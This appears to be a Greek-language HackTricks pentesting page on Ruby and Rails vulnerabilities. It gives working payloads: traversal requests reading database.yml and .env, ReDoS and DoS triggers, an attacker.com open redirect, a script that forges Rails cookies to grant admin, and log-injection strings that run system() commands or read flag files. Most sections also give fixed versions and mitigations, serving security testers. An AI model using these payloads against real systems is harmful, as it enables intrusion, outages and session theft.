# Κόλπα Ruby

{{#include ../../banners/hacktricks-training.md}}

## Μεταφόρτωση αρχείου προς RCE

Όπως εξηγείται στο [αυτό το άρθρο](https://www.offsec.com/blog/cve-2024-46986/), η μεταφόρτωση ενός `.rb` αρχείου σε ευαίσθητους καταλόγους όπως `config/initializers/` μπορεί να οδηγήσει σε remote code execution (RCE) σε Ruby on Rails εφαρμογές.

Συμβουλές:
- Άλλες τοποθεσίες boot/eager-load που εκτελούνται κατά την εκκίνηση της εφαρμογής είναι επίσης επικίνδυνες όταν είναι writeable (π.χ., `config/initializers/` είναι η κλασική). Αν βρείτε ένα arbitrary file upload που καταλήγει οπουδήποτε κάτω από το `config/` και αργότερα αξιολογείται/evaluated/required, μπορεί να αποκτήσετε RCE κατά το boot.
- Ψάξτε για dev/staging builds που αντιγράφουν user-controlled αρχεία μέσα στο container image όπου το Rails θα τα φορτώσει κατά το boot.

## Active Storage image transformation → command execution (CVE-2025-24293)

Όταν μια εφαρμογή χρησιμοποιεί Active Storage με `image_processing` + `mini_magick`, και περνάει μη αξιόπιστες παραμέτρους σε μεθόδους μετασχηματισμού εικόνας, οι εκδόσεις Rails πριν τις 7.1.5.2 / 7.2.2.2 / 8.0.2.1 μπορούσαν να επιτρέψουν command injection επειδή κάποιες μέθοδοι μετασχηματισμού επιτρεπόταν κατά λάθος από προεπιλογή.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- Τι να δοκιμάσετε κατά τη δοκιμή
- Εντοπίστε endpoints που δέχονται variant/processing options, ονόματα μετασχηματισμών ή arbitrary ImageMagick arguments.
- Fuzz `params[:t]` και `params[:v]` για ύποπτα errors ή execution side-effects. Αν μπορείτε να επηρεάσετε το όνομα της μεθόδου ή να περάσετε raw arguments που φτάνουν στο MiniMagick, ενδέχεται να έχετε code exec στον host του image processor.
- Αν έχετε μόνο read-access στα generated variants, δοκιμάστε blind exfiltration μέσω crafted ImageMagick operations.

- Αντιμετώπιση / ανίχνευση
- Αν δείτε Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 με Active Storage + `image_processing` + `mini_magick` και user-controlled μετασχηματισμούς, θεωρήστε το εκμεταλλεύσιμο. Συνιστάται ενημέρωση και επιβολή αυστηρής allowlist για methods/params και μια hardened ImageMagick policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Αν το target stack χρησιμοποιεί Rack middleware άμεσα ή μέσω frameworks, εκδόσεις του `rack` πριν από 2.2.13, 3.0.14 και 3.1.12 επιτρέπουν Local File Inclusion μέσω `Rack::Static` όταν το `:root` είναι unset/misconfigured. Encoded traversal στο `PATH_INFO` μπορεί να αποκαλύψει αρχεία κάτω από το working directory της διεργασίας ή έναν απρόσμενο root.

- Ψάξτε για εφαρμογές που mount-άρουν `Rack::Static` σε `config.ru` ή middleware stacks. Δοκιμάστε encoded traversals εναντίον static paths, για παράδειγμα:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Προσαρμόστε το prefix ώστε να ταιριάζει με τα configured `urls:`. Αν η εφαρμογή απαντήσει με το περιεχόμενο αρχείου, πιθανόν έχετε LFI σε οτιδήποτε κάτω από το resolved `:root`.

- Mitigation: αναβαθμίστε το Rack; βεβαιωθείτε ότι το `:root` δείχνει μόνο σε έναν κατάλογο με public αρχεία και έχει οριστεί ρητά.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` και < `2.2.8.1` ξόδευε super-linear χρόνο για να κάνει parse crafted `Content-Type: multipart/form-data` headers. Ένα μόνο POST με μια γιγαντιαία λίστα παραμέτρων `A=` μπορεί να κολλήσει έναν Puma/Unicorn worker και να προκαλέσει DoS ή starvation της request queue.

- Γρήγορο PoC (θα κρεμάσει έναν worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Δουλεύει εναντίον οποιουδήποτε Rack-based stack (Rails/Sinatra/Hanami/Grape). Αν υπάρχει fronting από nginx/haproxy με keep-alive, επαναλάβετε παράλληλα για να εξαντλήσετε workers.
- Διορθώθηκε κάνοντας τον parser linear; ελέγξτε για `rack` gem version < `3.0.9.1` ή < `2.2.8.1`. Σε αξιολογήσεις, επισημάνετε ότι τα WAFs σπάνια μπλοκάρουν αυτό επειδή το header είναι syntactically valid.

## REXML XML parser ReDoS (CVE-2024-49761)

Το gem REXML < 3.3.9 (Ruby 3.1 και παλαιότερα) κάνει catastrophic backtracking όταν κάνει parse hex numeric character references που περιέχουν μεγάλα runs ψηφίων (π.χ., `&#1111111111111x41;`). Οποιοδήποτε XML επεξεργάζεται από REXML ή βιβλιοθήκες που το τυλίγουν (SOAP/XML API clients, SAML, SVG uploads) μπορεί να χρησιμοποιηθεί για CPU exhaustion.

Minimal trigger against a Rails endpoint that parses XML:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Αν η διεργασία παραμένει απασχολημένη για δευτερόλεπτα και η CPU του worker παρουσιάζει αιχμές, πιθανότατα είναι ευάλωτη. Η επίθεση είναι χαμηλού bandwidth και επηρεάζει επίσης background jobs που ingest XML.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Εφαρμογές που χρησιμοποιούν το gem `cgi` (προεπιλογή σε πολλά Rack stacks) μπορούν να παγώσουν με ένα μόνο κακόβουλο header:
- `CGI::Cookie.parse` είχε υπερ-γραμμική συμπεριφορά· τεράστιες συμβολοσειρές cookie (χιλιάδες delimiters) προκαλούν συμπεριφορά O(N²).
- `CGI::Util#escapeElement` regex επέτρεπε ReDoS στο HTML escaping.

Και τα δύο προβλήματα έχουν διορθωθεί στις εκδόσεις `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. Για pentests, στείλτε ένα τεράστιο `Cookie:` header ή δώστε μη αξιόπιστο HTML σε helper code και παρακολουθήστε για worker lockup. Συνδυάστε με keep-alive για ενίσχυση.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

Το gem `googlesign_in` < 1.3.0 (χρησιμοποιείται για Google OAuth σε Rails) εκτελούσε έναν ελλιπή έλεγχο same-origin στην παράμετρο `proceedto`. Ένα malformed URL όπως `proceedto=//attacker.com/%2F..` παρακάμπτει τον έλεγχο και ανακατευθύνει τον χρήστη εκτός ιστότοπου ενώ διατηρεί Rails flash/session cookies.

Exploit flow:
1. Victim κάνει κλικ σε crafted Google Sign-In link που φιλοξενείται από attacker.
2. Μετά τον authentication, το gem ανακατευθύνει σε domain ελεγχόμενο από attacker, leaking flash notices ή οποιαδήποτε δεδομένα αποθηκευμένα σε cookies scoped στο wildcard domain.
3. Αν η εφαρμογή αποθηκεύει short-lived tokens ή magic links στο flash, αυτό μπορεί να μετατραπεί σε account takeover.

Κατά τη δοκιμή, grep το Gemfile.lock για `googlesign_in` < 1.3.0 και δοκιμάστε malformed τιμές `proceedto`. Επιβεβαιώστε μέσω του Location header και cookie reflection.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Το Rails encrypts και signs cookies χρησιμοποιώντας κλειδιά που προέρχονται από `secret_key_base`. Αν αυτή η τιμή leaks (π.χ. σε repo, logs, ή misconfigured credentials), συνήθως μπορείτε να decrypt, modify, και re-encrypt cookies. Αυτό συχνά οδηγεί σε authz bypass αν η εφαρμογή αποθηκεύει roles, user IDs, ή feature flags σε cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby to decrypt/forge cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Σημειώσεις:
- Παλαιότερες εφαρμογές μπορεί να χρησιμοποιούν AES-256-CBC και salts `encrypted cookie` / `signed encrypted cookie`, ή JSON/Marshal serializers. Προσαρμόστε αναλόγως τα salts, το cipher και τον serializer.
- Σε περίπτωση compromise/assessment, rotate το `secret_key_base` για να ακυρώσετε όλα τα υπάρχοντα cookies.

## Δείτε επίσης (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE μέσω Ruby `load` και `Pathname.cleanpath` smuggling

Όταν μια εφαρμογή (συχνά ένα απλό Rack/Sinatra/Rails endpoint) συνδυάζει:
- καταγράφει μια συμβολοσειρά ελεγχόμενη από τον χρήστη verbatim, και
- στη συνέχεια κάνει `load` ενός αρχείου του οποίου το μονοπάτι προκύπτει από την ίδια συμβολοσειρά (μετά το `Pathname#cleanpath`),

Συχνά μπορείτε να επιτύχετε remote code execution δηλητηριάζοντας το log και στη συνέχεια αναγκάζοντας την εφαρμογή να κάνει `load` το αρχείο log. Βασικά primitives:

- Το Ruby `load` εκτελεί το περιεχόμενο του στοχευόμενου αρχείου ως Ruby ανεξαρτήτως επέκτασης αρχείου. Οποιοδήποτε αναγνώσιμο αρχείο κειμένου των οποίων τα περιεχόμενα αναλύονται ως Ruby θα εκτελεστεί.
- Το `Pathname#cleanpath` συμπτύσσει τα τμήματα `.` και `..` χωρίς πρόσβαση στο filesystem, επιτρέποντας path smuggling: περιεχόμενο υπό έλεγχο του επιτιθέμενου μπορεί να προστεθεί στην αρχή για logging ενώ το καθαρισμένο μονοπάτι εξακολουθεί να επιλύεται στο επιθυμητό αρχείο προς εκτέλεση (π.χ. `../logs/error.log`).

### Ελάχιστο ευάλωτο pattern
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Γιατί το log μπορεί να περιέχει έγκυρο Ruby
`Logger` γράφει προθεματικές γραμμές όπως:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
Στο Ruby, το `#` ξεκινά ένα σχόλιο και το `9/2/2025` είναι απλώς αριθμητική. Για να εισάγετε έγκυρο Ruby code χρειάζεται να:
- Ξεκινήσετε το payload σε νέα γραμμή ώστε να μην σχολιάζεται από το `#` στην INFO γραμμή· στείλτε ένα αρχικό newline (`\n` ή `%0A`).
- Κλείσετε το ανοικτό `[` που εισήγαγε η INFO γραμμή. Ένα κοινό κόλπο είναι να ξεκινήσετε με `]` και προαιρετικά να ικανοποιήσετε τον parser με `][0]=1`.
- Έπειτα τοποθετήσετε αυθαίρετο Ruby (π.χ. `system(...)`).

Παράδειγμα του τι θα εμφανιστεί στο log μετά από ένα request με crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Κρυφομεταφορά ενός μόνο string που τόσο καταγράφει code όσο και επιλύεται στη διαδρομή του log
Θέλουμε ένα μόνο string που ελέγχεται από attacker και:
- όταν καταγράφεται raw, περιέχει το Ruby payload μας, και
- όταν περαστεί μέσω `Pathname.new(<input>).cleanpath`, επιλύεται σε `../logs/error.log` ώστε το επακόλουθο `load` να εκτελέσει το μόλις μολυσμένο log αρχείο.

`Pathname#cleanpath` αγνοεί τα schemes και συμπτύσσει traversal components, οπότε το παρακάτω λειτουργεί:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Το `#` πριν από το `://` εξασφαλίζει ότι η Ruby αγνοεί το υπόλοιπο όταν το log εκτελείται, ενώ το `cleanpath` εξακολουθεί να μειώνει το επίθημα σε `../logs/error.log`.
- Το leading newline σπάει τη γραμμή INFO· το `]` κλείνει την κρεμόμενη αγκύλη· το `][0]=1` ικανοποιεί τον parser.

### End-to-end exploitation
1. Στείλτε τα παρακάτω ως το όνομα του backup script (URL-encode το πρώτο newline ως `%0A` αν χρειάζεται):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Η εφαρμογή καταγράφει την ακατέργαστη συμβολοσειρά σας στο `logs/error.log`.
3. Η εφαρμογή υπολογίζει το `cleanpath` που επιλύεται σε `../logs/error.log` και καλεί `load` πάνω του.
4. Η Ruby εκτελεί τον κώδικα που εισαγάγατε στο log.

Για να εξάγετε ένα αρχείο σε ένα περιβάλλον τύπου CTF:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (ο πρώτος χαρακτήρας είναι newline):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Αναφορές

- [Rails Security Announcement: CVE-2025-24293 Active Storage unsafe transformation methods (fixed in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub Advisory: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath docs](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [How Ruby load works](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS advisory (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby security advisories for CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
